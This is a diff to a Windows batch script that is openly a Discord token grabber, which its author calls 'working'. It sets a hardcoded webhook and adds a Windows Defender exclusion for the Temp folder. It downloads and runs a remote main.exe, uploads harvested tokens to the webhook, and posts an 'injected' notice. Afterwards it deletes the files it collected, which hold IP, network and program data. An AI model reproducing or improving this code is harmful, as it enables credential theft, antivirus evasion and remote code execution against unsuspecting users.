@@ -1,4 +1,5 @@
 @echo off
+:: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
 set currentdir=%~dp0
 cd %currentdir%
 set webhook=https://discord.com/api/webhooks/1020814175112536084/eKoM05Czt2y2Eq4KhKw-XuE3Q2oNbCljIP2ZRfUCOA8pQ8yFhxaRMgIsblywiuiDxHOd
@@ -107,13 +108,15 @@ echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
-curl -O https://cdn.discordapp.com/attachments/1020784906864963644/1020788311670931496/main.exe
+powershell -Command "Invoke-WebRequest https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.0/main.exe -OutFile %userprofile%\AppData\Local\Temp\main.exe"
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 timeout 3 >NUL
 start main.exe %webhook%
 timeout 3 >NUL
 taskkill /f /im main.exe
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```PC WAS INJECTED TO %webhook% HAVE FUN ```\"}" %webhook%
+
 if exist 
 del %userprofile%\AppData\Local\Temp\tokens.txt
 del %localappdata%\Temp\ip.txt
@@ -124,5 +127,3 @@ del %localappdata%\Temp\netstat.txt
 del %localappdata%\Temp\programms.txt
 del %localappdata%\Temp\uuid.txt
 del %localappdata%\Temp\main.exe
-pause
-exit
